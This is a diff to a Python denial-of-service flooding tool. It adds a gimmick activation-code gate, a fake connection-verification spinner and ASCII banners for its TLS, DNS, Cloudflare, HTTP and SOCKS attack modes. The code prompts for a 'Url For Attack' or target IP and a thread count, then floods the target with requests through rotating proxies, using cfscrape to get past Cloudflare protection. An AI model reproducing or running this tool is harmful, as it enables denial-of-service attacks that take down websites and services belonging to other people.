@@ -1,5 +1,6 @@
 import socket
 import os
+import requests
 import sys
 import time 
 from time import sleep
@@ -13,6 +14,83 @@ from termcolor import colored
 import pyfiglet
 os.system("clear")
 
+def generate_activation_code():
+    return ''.join(str(random.randint(0, 9)) for _ in range(4))
+
+def display_code_for_10_seconds(activation_code):
+    for remaining_seconds in range(10, 0, -1):
+        print(f"{Fore.GREEN}Your activation code: {activation_code}{Style.RESET_ALL}")
+        print_colorized_time(remaining_seconds)
+        time.sleep(1)
+        clear_screen()
+    print(f"{Fore.BLUE}Activation code expired. Please enter your code.{Style.RESET_ALL}")
+
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def print_colorized_time(remaining_seconds):
+    if remaining_seconds >= 7:
+        color = Fore.GREEN
+    elif 4 <= remaining_seconds <= 6:
+        color = Fore.YELLOW
+    else:
+        color = Fore.RED
+    
+    print(f"{color}Time remaining: {remaining_seconds} seconds", end='\r')
+
+def main():
+    activation_code = generate_activation_code()
+    display_code_for_10_seconds(activation_code)
+
+    user_input = input(f"{Fore.BLUE}Enter activation code: {Style.RESET_ALL}")
+    
+    if user_input == activation_code:
+        print(f"{Fore.GREEN}Activation successful. You can now proceed.{Style.RESET_ALL}")
+    else:
+        print(f"{Fore.RED}ERROR {Fore.YELLOW}Incorrect activation code. Exiting...{Style.RESET_ALL}")
+        sys.exit()
+
+if __name__ == "__main__":
+    main()
+
+os.system("clear")
+
+def spin():
+    delay = 0.25
+    spinner = ['█■■■■', '■█■■■', '■■█■■', '■■■█■', '■■■■█']
+
+    for _ in range(1):
+        for i in spinner:
+            message = f"[*] {Fore.BLUE}Checking your internet connection...[{i}]{Style.RESET_ALL}"
+            colored_message = colored(message, 'blue', attrs=['bold'])
+            sys.stdout.write(f"\r{colored_message}   ")
+            sys.stdout.flush()
+            time.sleep(delay)
+
+    sys.stdout.write("\r")
+    sys.stdout.flush()
+    done_message = colored("[+] Your Internet connection has been verified", 'yellow', attrs=['bold'])
+    sys.stdout.write("\033[K") 
+    print(done_message)
+    time.sleep(3)
+
+spin()
+
+print(1*"\n")
+
+def check_internet_connection():
+    try:
+        response = requests.get('http://www.google.com', timeout=5)
+        return True
+    except requests.ConnectionError:
+        return False
+
+if check_internet_connection():
+    print(f"{Fore.GREEN}Internet connection is available. You can proceed with execution.{Style.RESET_ALL}")
+else:
+    print(f"{Fore.RED}No internet connection. Exiting the code.{Style.RESET_ALL}")
+    exit()
+
 user = open("Attack-users.txt", "r").read().splitlines()
 proxy = open("proxy.txt", "r").read().splitlines()
 os.system("clear")
@@ -24,7 +102,7 @@ def wait_with_spinner(seconds, colors):
         for symbol in symbols:
             random_color = random.choice(colors)
             colored_symbol = colored(symbol, random_color)
-            sys.stdout.write(f"\rPlease wait {colored_symbol}  ")
+            sys.stdout.write(f"\r{Fore.GREEN}[+] {Fore.BLUE} Please wait {colored_symbol} {Style.RESET_ALL}")
             sys.stdout.flush()
             time.sleep(0.25)
 
@@ -128,29 +206,55 @@ while True:
          colors = ['grey', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
 
          selected_color = random.choice(colors)
+        
+         text = '''
+                                     
+███▀▀██▀▀███▄█▀▀▀█▄█         
+█▀   ██   ▀███    ▀█         
+     ██    ▀███▄     ██▀▀█▄  
+     ██      ▀█████▄███  ▀██ 
+     ██    ▄     ▀██     ▄██ 
+     ██    ██     ██   ▀▀██▄ 
+   ▄████▄  █▀█████▀       ██ 
+                   ███  ▄█▀  
+                    █████▀   
 
-         text = 'FS3'
+        '''
 
-         lo = pyfiglet.figlet_format(text)
-         colored_lo = colored(lo, color=selected_color)
+         colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']
 
-         print(colored_lo)
+         random_color = random.choice(colors)
+
+         colored_text = colored(text, random_color)
+         print(colored_text)
 
          host = input(f"{Fore.GREEN}Url For Attack:{Style.RESET_ALL}")
          num = int(input(f"{Fore.GREEN}Enter thread:{Style.RESET_ALL}"))
          break
     elif cmd == "DNS":
-    
+         
          colors = ['grey', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
 
          selected_color = random.choice(colors)
 
-         text = 'DNS'
+         text = '''
+                                        
+▀███▀▀▀██▄ ▀███▄   ▀███▀▄█▀▀▀█▄█
+  ██    ▀██▄ ███▄    █ ▄██    ▀█
+  ██     ▀██ █ ███   █ ▀███▄    
+  ██      ██ █  ▀██▄ █   ▀█████▄
+  ██     ▄██ █   ▀██▄█ ▄     ▀██
+  ██    ▄██▀ █     ███ ██     ██
+▄████████▀ ▄███▄    ██ █▀█████▀ 
 
-         lo = pyfiglet.figlet_format(text)
-         colored_lo = colored(lo, color=selected_color)
+         '''
+         colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']
 
-         print(colored_lo)
+         random_color = random.choice(colors)
+
+         colored_text = colored(text, random_color)
+
+         print(colored_text)
 
          host = input(f"{Fore.GREEN}Url For Attack:{Style.RESET_ALL}")
          num = int(input(f"{Fore.GREEN}Enter thread:{Style.RESET_ALL}"))
@@ -161,12 +265,24 @@ while True:
 
         selected_color = random.choice(colors)
 
-        text = ' Cloud Flare'
+        text = '''
+             ▄▄                             ▄▄                 ▄▄                          
+  ▄▄█▀▀▀█▄█▀███                           ▀███     ▀███▀▀▀███▀███                          
+▄██▀     ▀█  ██                             ██       ██    ▀█  ██                          
+██▀       ▀  ██   ▄██▀██▄▀███  ▀███    ▄█▀▀███       ██   █    ██  ▄█▀██▄ ▀███▄███  ▄▄█▀██ 
+██           ██  ██▀   ▀██ ██    ██  ▄██    ██       ██▀▀██    ██ ██   ██   ██▀ ▀▀ ▄█▀   ██
+██▄          ██  ██     ██ ██    ██  ███    ██       ██   █    ██  ▄█████   ██     ██▀▀▀▀▀▀
+▀██▄     ▄▀  ██  ██▄   ▄██ ██    ██  ▀██    ██       ██        ██ ██   ██   ██     ██▄    ▄
+  ▀▀█████▀ ▄████▄ ▀█████▀  ▀████▀███▄ ▀████▀███▄   ▄████▄    ▄████▄████▀██▄████▄    ▀█████▀
 
-        lo = pyfiglet.figlet_format(text)
-        colored_lo = colored(lo, color=selected_color)
+         '''
+        colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']
 
-        print(colored_lo)
+        random_color = random.choice(colors)
+
+        colored_text = colored(text, random_color)
+
+        print(colored_text)
 
         host = input(f"{Fore.GREEN}Url For Attack:{Style.RESET_ALL}")
         num = int(input(f"{Fore.GREEN}Enter thread:{Style.RESET_ALL}"))
@@ -177,12 +293,24 @@ while True:
 
         selected_color = random.choice(colors)
 
-        text = 'HTTP'
+        text = '''
+                                               
+▀████▀  ▀████▀▀██▀▀██▀▀█████▀▀██▀▀██████▀▀▀██▄ 
+  ██      ██  █▀   ██   ▀█▀   ██   ▀█ ██   ▀██▄
+  ██      ██       ██         ██      ██   ▄██ 
+  ██████████       ██         ██      ███████  
+  ██      ██       ██         ██      ██       
+  ██      ██       ██         ██      ██       
+▄████▄  ▄████▄▄  ▄████▄     ▄████▄  ▄████▄     
+                                            
+         '''
+        colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']
 
-        lo = pyfiglet.figlet_format(text)
-        colored_lo = colored(lo, color=selected_color)
+        random_color = random.choice(colors)
 
-        print(colored_lo)
+        colored_text = colored(text, random_color)
+
+        print(colored_text)
         
         host2 = input(f"{Fore.GREEN}Url For Attack:{Style.RESET_ALL}")
         num2 = int(input(f"{Fore.GREEN}Enter thread:{Style.RESET_ALL}"))
@@ -193,15 +321,27 @@ while True:
 
         selected_color = random.choice(colors)
 
-        text = 'SOCKS'
+        text = '''
+                                                  
+ ▄█▀▀▀█▄█ ▄▄█▀▀██▄   ▄▄█▀▀▀█▄█████▀ ▀███▀ ▄█▀▀▀█▄█
+▄██    ▀███▀    ▀██▄██▀     ▀█ ██   ▄█▀  ▄██    ▀█
+▀███▄   ██▀      ▀███▀       ▀ ██ ▄█▀    ▀███▄    
+  ▀█████▄█        ███          █████▄      ▀█████▄
+▄     ▀███▄      ▄███▄         ██  ███   ▄     ▀██
+██     ████▄    ▄██▀██▄     ▄▀ ██   ▀██▄ ██     ██
+█▀█████▀  ▀▀████▀▀   ▀▀█████▀▄████▄   ███▄▀█████▀ 
+                                                     
+         '''
+        colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']
 
-        lo = pyfiglet.figlet_format(text)
-        colored_lo = colored(lo, color=selected_color)
+        random_color = random.choice(colors)
 
-        print(colored_lo)
+        colored_text = colored(text, random_color)
+
+        print(colored_text)
         
         host3 = input(f"{Fore.RED}IP For Attack:{Style.RESET_ALL}")
-        port = int(input(f"{Fore.BLUE}Port for Attack:{Style.RESET_ALL}"))
+        port = int(input(f"{Fore.BLUE}Port for Attack {Fore.YELLOW}Enter Your Custom 4-digit Port {Fore.GREEN}[1024-9999]:{Style.RESET_ALL}"))
         num3 = int(input(f"{Fore.GREEN}Enter thread:{Style.RESET_ALL}"))
         break
     else:
@@ -216,7 +356,7 @@ def ddos(num):
         u = random.choice(user)
         sc = cfscrape.CloudflareScraper()
         cf = sc.get(host, headers={'Attack-users': u}, proxies=proxy2)
-        print("[+]--Send Packet FROME " + random.choice(proxy) + " TO " + host + ":" + str(cf.status_code))
+        print(f"{Fore.BLUE}[{Fore.GREEN}+{Fore.BLUE}]- Send Packet FROME {Style.RESET_ALL}" + random.choice(proxy) + " TO " + host + ":" + str(cf.status_code))
         return True
     except:
         print(f"{Fore.RED}Connect error!!{Style.RESET_ALL}")
@@ -229,7 +369,7 @@ def http(nurt):
         }
         with httpx.Client(proxies=proxy3) as client:
             r = client.head(host2, headers={'Attack-users': random.choice(user)})
-            print("[+]--Send Packet OF the response:" + str(r.status_code))
+            print(f"{Fore.BLUE}[{Fore.GREEN}+{Fore.BLUE}]- {Fore.GREEN}Send Packet OF the response:{Style.RESET_ALL}" + str(r.status_code))
     except:
         print("Connect time out!!")
 
